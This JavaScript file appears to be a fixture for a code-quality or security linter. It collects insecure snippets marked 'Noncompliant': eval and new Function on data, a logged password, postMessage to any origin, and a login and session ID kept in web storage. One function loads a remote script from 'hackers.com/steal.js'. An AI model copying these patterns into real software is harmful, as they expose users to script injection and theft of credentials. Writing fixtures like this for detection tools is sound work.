function Example(x) {
    return x * x;
};

if(false) {
    alert("Unexpected Condition");
}

var value = eval('obj.' + propName); // Noncompliant

console.log(password_entered); // Noncompliant

for (i = 1; i<5; i++) {
    // Print i to the Output window.
    Debug.write("loop index is " + i);
    // Wait for user to resume.
    debugger;
}

var myWindow = document.getElementById('myIFrame').contentWindow;
myWindow.postMessage(message, "*"); // Noncompliant; how do you know what you loaded in 'myIFrame' is still there?

var obj =  new Function("return " + data)();  // Noncompliant

localStorage.setItem("login", login); // Noncompliant
sessionStorage.setItem("sessionId", sessionId); // Noncompliant

function include(url) {
    var s = document.createElement("script");
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", url);
    document.body.appendChild(s);
}
include("http://hackers.com/steal.js")  // Noncompliant

var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // Noncompliant

Example($(window).getElementsByClassName('myClass').length);